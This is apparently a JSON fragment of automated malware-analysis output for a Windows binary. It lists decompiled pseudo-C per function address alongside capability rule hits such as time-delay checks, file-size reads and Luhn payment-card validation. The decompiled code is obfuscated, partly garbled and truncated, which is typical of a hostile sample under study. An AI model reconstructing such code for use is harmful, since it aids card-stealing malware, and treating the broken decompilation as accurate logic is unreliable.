        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040336d) overlaps instruction at (ram,0x00403369)\n// \n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Removing unreachable block (ram,0x0040313a)\n// WARNING: Removing unreachable block (ram,0x00403145)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.00403040(void)\n\n{\n    char *pcVar1;\n    int32_t **ppiVar2;\n    uchar uVar3;\n    uchar *puVar4;\n    uint32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    int32_t iVar5;\n    int32_t unaff_EBX;\n    uchar *puVar6;\n    int32_t *unaff_ESI;\n    uint32_t uVar7;\n    int32_t *piVar8;\n    int32_t *unaff_EDI;\n    uint32_t uVar9;\n    int32_t *piVar10;\n    bool bVar11;\n    char cVar12;\n    char cVar13;\n    ulong uVar14;\n    uint64_t uVar15;\n    uint uStack144;\n    int32_t iStack116;\n    uchar *apuStack76 [2];\n    uint16_t uStack66;\n    int32_t *piStack64;\n    uint32_t uStack60;\n    uint32_t uStack56;\n    uchar uStack42;\n    uchar uStack41;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint32_t uStack28;\n    int32_t iStack24;\n    uint var_bp_ch;\n    \n    puVar4 = &stack0xfffffffc;\n    puVar6 = &stack0xfffffffc;\n    uStack28 = 0;\n    uStack32 = 0x28847e93;\n    uStack36 = CONCAT22(uStack36._2_2_, 0xe1f6);\n    uStack40 = 0x30a8cb6c;\n    uStack41 = 0x38;\n    uStack42 = 0xa1;\n    cVar13 = '\\0';\n    cVar12 = '\\0';\n    bVar11 = false;\n    uVar14 = (*_sym.imp.KERNEL32.dll_FileTimeToLocalFileTime)();\n    if (!bVar11 && cVar13 == cVar12) {\n        *(unaff_EDI + -0x182cf6a2) = *(unaff_EDI + -0x182cf6a2) << (extraout_ECX & 0x1f);\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (cVar13 == cVar12) goto code_r0x0040319e;\n    while( true ) {\n        piVar10 = uVar14;\n        unaff_EBX = unaff_EBX + -1;\n        pcVar1 = unaff_ESI + 0x3556b899;\n        *pcVar1 = (*pcVar1 - uVar14) - (*(piVar10 + 0x79) < uVar14 >> 0x20);\n        if (*pcVar1 < '\\0') break;\n        ppiVar2 = (uVar14 >> 0x20) + -0x653f27d6;\n        piVar8 = *ppiVar2;\n        *ppiVar2 = unaff_ESI;\n        piVar10 = piVar10 + 0x1ee25b58;\n        *(piVar8 + -0x2f) = *(piVar8 + -0x2f) & unaff_EBX >> 8;\n        uVar3 = *piVar10;\n        *piVar10 = piVar10 >> 8;\n        uVar7 = piVar10 & 0xffff0000 | CONCAT11(uVar3, piVar10) | 0x538766e2;\n        unaff_EDI = unaff_EDI + 1U ^ *(puVar4 + -0x3f503182);\n        unaff_EBX = *(uVar7 + 0xf9b801e8);\n        puVar4 = 0x7938f3df;\n        *0x1f9ea79e = piVar8;\n        *(unaff_EBX + -0x75cf76d9) = *(unaff_EBX + -0x75cf76d9) & apuStack76;\n        uVar14 = CONCAT44(0xf9b80239, uVar7 & 0xffffffab ^ 0x437d22ff);\n        unaff_ESI = piVar8;\n        apuStack76[0] = puVar4;\n    }\n    if (extraout_ECX == 0) {\n        *piVar10 = *piVar10 + piVar10;\n        iVar5 = in(uVar14 >> 0x20);\n        *unaff_EDI = iVar5;\n        return piVar10;\n    }\n    puVar6 = puVar4;\n    piVar8 = unaff_ESI;\n    if ((piVar10 & 0xffffff10 & uStack60) != extraout_ECX) {\n        piStack64 = 0x30a8cb62 - uStack36;\ncode_r0x004031b1:\n        do {\n            uVar7 = iStack24 + (0xc391047a < uStack28);\n            uVar9 = -(0x7e5a484b < uStack28) - iStack24;\n        } while (uVar7 <= uVar9 && (0x7e5a484b - uStack28 < uStack28 + 0x3c6efb85) <= uVar9 - uVar7);\n        return piStack64;\n    }\n    do {\n        cVar13 = '\\0';\n        cVar12 = (uStack40._3_1_ ^ 0x9b) < '\\0';\n        bVar11 = (uStack40._3_1_ ^ 0x9b) == 0;\n        uVar15 = (*_sym.imp.KERNEL32.dll_FlushViewOfFile)();\n        if (!bVar11 && cVar13 == cVar12) {\n            *(unaff_EDI + -0x182cf6a2) = *(unaff_EDI + -0x182cf6a2) << (extraout_ECX_00 & 0x1f);\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        if (cVar13 == cVar12) {\n            piVar10 = unaff_EDI + 1;\n            unaff_ESI = piVar8 + 1;\n            iVar5 = extraout_ECX_00;\n            if (*piVar8 - *unaff_EDI < 0) {\n                uVar15 = uVar15 & 0xffffffff00000000 | uVar15 & 0xffff0000 | CONCAT11(0xe7, uVar15);\n                goto code_r0x004032ef;\n            }\ncode_r0x004032e3:\n            *(piVar10 + -0x182cf6a2) = *(piVar10 + -0x182cf6a2) << (iVar5 & 0x1f);\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        while( true ) {\n            uVar7 = uVar15;\n            unaff_EBX = unaff_EBX + -1;\n            pcVar1 = piVar8 + 0x3556b899;\n            *pcVar1 = (*pcVar1 - uVar15) - (*(uVar7 + 0x79) < uVar15 >> 0x20);\n            if (*pcVar1 < '\\0') break;\n            ppiVar2 = (uVar15 >> 0x20) + -0x653f27d6;\n            piVar10 = *ppiVar2;\n            *ppiVar2 = piVar8;\n            puVar4 = uVar7 + 0x7b896d60;\n            *(piVar10 + -0x2f) = *(piVar10 + -0x2f) & unaff_EBX >> 8;\n            uVar3 = *puVar4;\n            *puVar4 = puVar4 >> 8;\n            uVar7 = puVar4 & 0xffff0000 | CONCAT11(uVar3, puVar4) | 0x538766e2;\n            unaff_EDI = unaff_EDI + 1U ^ *(puVar6 + -0x3f503182);\n            unaff_EBX = *(uVar7 + 0xf9b801e8);\n            puVar6 = 0x7938f3df;\n            *0xe2b1e9aa = 0x7938f3df;\n            *0x1f9ea79e = piVar10;\n            *(unaff_EBX + -0x75cf76d9) = *(unaff_EBX + -0x75cf76d9) & 0xe2b1e9aa;\n            uVar15 = CONCAT44(0xf9b80239, uVar7 & 0xffffffab ^ 0x437d22ff);\n            piVar8 = piVar10;\n        }\n        if (extraout_ECX_00 != 0) {\n            uVar7 = uVar15 & 0x10;\n            uStack56 = uStack60;\n        }\n        if (uVar7 <= uStack40._2_1_) goto code_r0x004031b1;\n        unaff_ESI = uStack56 & 0x30a8cb6d - uStack36;\n        bVar11 = unaff_ESI == (uStack36 ^ 0x30a8cb6c);\ncode_r0x0040319e:\n        piVar10 = unaff_EDI;\n        if (!bVar11) {\n            piStack64 = uStack36 + 0xcf57348e;\n            goto code_r0x004031b1;\n        }\n        while( true ) {\n            cVar13 = SCARRY4(uStack36, -0x30a8cb6c);\n            cVar12 = uStack36 + 0xcf573494 < 0;\n            bVar11 = uStack36 == 0x30a8cb6c;\n            uVar15 = (*0x403d7a)();\n            iVar5 = extraout_ECX_01;\n            if (!bVar11 && cVar13 == cVar12) goto code_r0x004032e3;\n            if (cVar13 == cVar12) {\n                for (iStack116 = 0; iStack116 != 0x12; iStack116 = iStack116 + 1) {\n                    (*_sym.imp.KERNEL32.dll_GetSystemDefaultUILanguage)();\n                    (*_sym.imp.USER32.dll_GetMenuDefaultItem)(0x9f2e28, 0x63c, 0xca);\n                    (*_sym.imp.USER32.dll_GetWindow)(0x39153f, uStack144);\n                    (*_sym.imp.USER32.dll_AnyPopup)();\n                }\n                return 0x12;\n            }\n            while( true ) {\n                unaff_EBX = unaff_EBX + -1;\n                pcVar1 = unaff_ESI + 0x3556b899;\n                *pcVar1 = (*pcVar1 - uVar15) - (*(uVar15 + 0x79) < uVar15 >> 0x20);\n                if (*pcVar1 < '\\0') break;\ncode_r0x004032ef:\n                ppiVar2 = (uVar15 >> 0x20) + -0x653f27d6;\n                piVar8 = *ppiVar2;\n                *ppiVar2 = unaff_ESI;\n                puVar4 = uVar15 + 0x7b896d60;\n                *(piVar8 + -0x2f) = *(piVar8 + -0x2f) & unaff_EBX >> 8;\n                uVar3 = *puVar4;\n                *puVar4 = puVar4 >> 8;\n                uVar7 = puVar4 & 0xffff0000 | CONCAT11(uVar3, puVar4) | 0x538766e2;\n                piVar10 = piVar10 + 1U ^ *(puVar6 + -0x3f503182);\n                unaff_EBX = *(uVar7 + 0xf9b801e8);\n                puVar6 = 0x7938f3df;\n                *0xe2b1e9aa = 0x7938f3df;\n                *0x1f9ea79e = piVar8;\n                *(unaff_EBX + -0x75cf76d9) = *(unaff_EBX + -0x75cf76d9) & 0xe2b1e9aa;\n                uVar15 = CONCAT44(0xf9b80239, uVar7 & 0xffffffab ^ 0x437d22ff);\n                unaff_ESI = piVar8;\n            }\n            if (iVar5 == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            piVar8 = unaff_ESI;\n            unaff_EDI = piVar10;\n            if (uStack60 != (uVar15 & 0xffffff10)) break;\n            if ((uStack60 & 0x30a8cb6d - uStack36) != uStack36 + 0xcf573494) {\n                piStack64 = uStack36 + 0xcf573493;\n                goto code_r0x004031b1;\n            }\n            uStack66 = 0x4482 - uStack32;\n            if (0x192U - uStack32 <= uStack66) {\n                piStack64 = uStack36 + 0x9e0405e4;\n                goto code_r0x004031b1;\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 3118
    },
    "00403390": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid fcn.00403390(void)\n\n{\n    uint uStack72;\n    int32_t iStack44;\n    uint var_8h;\n    \n    for (iStack44 = 0; iStack44 != 0x12; iStack44 = iStack44 + 1) {\n        (*_sym.imp.KERNEL32.dll_GetSystemDefaultUILanguage)();\n        (*_sym.imp.USER32.dll_GetMenuDefaultItem)(0x9f2e28, 0x63c, 0xca);\n        (*_sym.imp.USER32.dll_GetWindow)(0x39153f, uStack72);\n        (*_sym.imp.USER32.dll_AnyPopup)();\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "00403660": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403660(char *arg_8h)\n\n{\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    if (((*arg_8h == -0x48) && (arg_8h[3] == 'P')) && (arg_8h[4] == -0x33)) {\n        var_10h = 1;\n    }\n    else if ((*arg_8h == -1) && (arg_8h[1] == '%')) {\n        var_10h = fcn.00403660(**(arg_8h + 2));\n    }\n    else {\n        var_10h = 0;\n    }\n    return var_10h;\n}\n",
        "token_count": 177
    },
    "00403730": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get file size"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid fcn.00403730(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uchar *puVar3;\n    uchar auStack88 [44];\n    uint16_t uStack44;\n    uint16_t uStack42;\n    uint16_t uStack40;\n    uint16_t uStack38;\n    uint uStack32;\n    ushort uStack26;\n    uint var_bp_ch;\n    \n    uStack26 = 0x4cd5;\n    uStack32 = 0xb1c8660;\n    uStack38 = 0xff3d;\n    (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    puVar3 = auStack88;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessIoCounters)(uVar1, puVar3);\n    uStack44 = uStack40 ^ 0x82ac;\n    uStack42 = uStack38 ^ 0xb1c;\n    (*_sym.imp.KERNEL32.dll_GetFileSize)(0x4fa06e, &uStack44, uVar1, puVar3, &uStack44, 0x4fa06e, uVar2);\n    return;\n}\n",
        "token_count": 289
    },
    "00403800": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403800(int32_t arg_8h)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        fcn.00402e40();\n    }\n    return arg_8h == 0;\n}\n",
        "token_count": 87
    },
    "00403b10": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_5h\n// WARNING: Removing unreachable block (ram,0x00403bdb)\n// WARNING: Removing unreachable block (ram,0x00403b88)\n\nuint __cdecl fcn.00403b10(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_24h;\n    uint var_1ch;\n    uint var_15h;\n    uint var_ch;\n    uint var_5h;\n    \n    iVar1 = fcn.00403be0();\n    if (iVar1 == 0) {\n        if (arg_8h == 0) {\n            iVar1 = fcn.00402c30();\n            if (iVar1 == 0) {\n                *NULL = 1;\n            }\n            else {\n                *NULL = 0;\n            }\n        }\n        else {\n            stack0xffffffe8 = 1;\n        }\n    }\n    else {\n        *NULL = 1;\n    }\n    return stack0xffffffe8;\n}\n",
        "token_count": 225
    },
    "00403be0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Removing unreachable block (ram,0x00403c90)\n\nuint fcn.00403be0(void)\n\n{\n    uint16_t uVar1;\n    int16_t iVar2;\n    uint arg_8h;\n    int32_t iVar3;\n    uint uStack64;\n    uint var_bp_ch;\n    \n    arg_8h = fcn.00401900();\n    iVar3 = fcn.004021b0(arg_8h);\n    uVar1 = *(iVar3 + 0x48);\n    iVar3 = fcn.004021b0(arg_8h);\n    iVar2 = *(iVar3 + 0x4a);\n    iVar3 = fcn.004012d0();\n    if (*(iVar3 + 0xa4) < 6) {\n        uStack64 = 1;\n    }\n    else if (uVar1 < 6) {\n        uStack64 = 1;\n    }\n    else if ((uVar1 == 6) && (iVar2 == 0)) {\n        uStack64 = 1;\n    }\n    else {\n        uStack64 = 0;\n    }\n    return uStack64;\n}\n",
        "token_count": 268
    },
    "00401100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401100(uint arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401010(arg_8h, 1);\n    return;\n}\n",
        "token_count": 51
    },
    "00401130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Removing unreachable block (ram,0x00401268)\n// WARNING: Removing unreachable block (ram,0x004011db)\n\nint32_t __cdecl fcn.00401130(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iStack68;\n    uint var_bp_ch;\n    \n    for (iStack68 = 0; iStack68 != arg_10h; iStack68 = iStack68 + 1) {\n        *(arg_8h + iStack68) = *(arg_ch + iStack68);\n    }\n    return arg_8h;\n}\n",
        "token_count": 156
    },
    "00401270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401270(uint arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401010(arg_8h, 3);\n    return;\n}\n",
        "token_count": 51
    },
    "004012a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004012a0(void)\n\n{\n    uint var_4h;\n    \n    fcn.00401270(0x18);\n    return;\n}\n",
        "token_count": 36
    },
    "004012d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint fcn.004012d0(void)\n\n{\n    int32_t iVar1;\n    uint var_bp_4h;\n    \n    iVar1 = fcn.004012a0();\n    return *(iVar1 + 0x30);\n}\n",
        "token_count": 69
    },
    "00401900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00401900(void)\n\n{\n    uint var_74h;\n    uint32_t var_70h;\n    uint var_6ch;\n    uint var_4ch;\n    uint var_ch;\n    uint32_t var_8h;\n    \n    var_8h = 0x356fc2cd;\n    fcn.004019a0(&var_6ch, str.ss.z, 0xb);\n    for (var_70h = var_8h ^ 0x356fc2cd; var_70h != (var_8h ^ 0x356fc2ed); var_70h = var_70h + (var_8h ^ 0x356fc2cc)) {\n        var_ch = 0x64015829;\n        *(&var_4ch + var_70h * 2) = *(&var_6ch + var_70h);\n    }\n    fcn.00401840(&var_4ch);\n    return;\n}\n",
        "token_count": 216
    },
    "004019a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_dh\n\nvoid __cdecl fcn.004019a0(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_dh;\n    \n    for (var_20h = 0; var_20h < arg_10h; var_20h = var_20h + 1) {\n        fcn.00402860(arg_8h, arg_ch, var_20h, *(var_20h % 0x10 + 0x404308));\n    }\n    return;\n}\n",
        "token_count": 181
    }
}